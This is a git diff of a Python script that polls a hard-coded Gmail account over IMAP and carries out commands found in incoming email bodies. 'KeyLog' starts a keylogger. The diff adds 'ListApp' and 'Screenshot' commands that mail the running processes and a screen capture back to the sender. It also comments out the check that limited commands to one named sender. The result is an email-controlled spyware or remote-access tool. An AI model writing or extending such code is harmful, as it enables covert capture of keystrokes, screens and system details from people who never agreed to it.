@@ -4,6 +4,7 @@ from email.header import decode_header
 from threading import Timer
 import time 
 import keyLog
+import sendMail
 
 # Gmail account credentials
 username = "tnmhoang.lop93@gmail.com"
@@ -37,22 +38,24 @@ from_, encoding = decode_header(email_message["From"])[0]
 if isinstance(from_, bytes):
     from_ = from_.decode(encoding)
 
-# Print email details
-if (from_ == "Tuấn Đạt"):
-    print("Subject:", subject)
-    print("From:", from_)
+sender_email = from_
 
-    # If the email message is multipart
-    if email_message.is_multipart():
-        for part in email_message.walk():
-            content_type = part.get_content_type()
-            content_disposition = str(part.get("Content-Disposition"))
-            try:
-                body = part.get_payload(decode=True).decode()
-            except:
-                pass
-            if content_type == "text/plain" and "attachment" not in content_disposition:
-                print(body)
+# Print email details
+#if (from_ == "Tuấn Đạt"):
+print("Subject:", subject)
+print("From:", from_)
+
+# If the email message is multipart
+if email_message.is_multipart():
+    for part in email_message.walk():
+        content_type = part.get_content_type()
+        content_disposition = str(part.get("Content-Disposition"))
+        try:
+            body = part.get_payload(decode=True).decode()
+        except:
+            pass
+        if content_type == "text/plain" and "attachment" not in content_disposition:
+            print(body)
 # Close the connection
 imap.logout()
 start = 0  # Define the start position in the string
@@ -71,3 +74,9 @@ if body.find("KeyLog", start, end) != -1:
         while time.time() - start_time < duration:
             pass
         listener.stop()
+
+if body.find("ListApp", start, end) != -1:
+    sendMail.send_process_email(sender_email)
+
+if body.find("Screenshot", start, end) != -1:
+    sendMail.send_screenshot_email(sender_email)
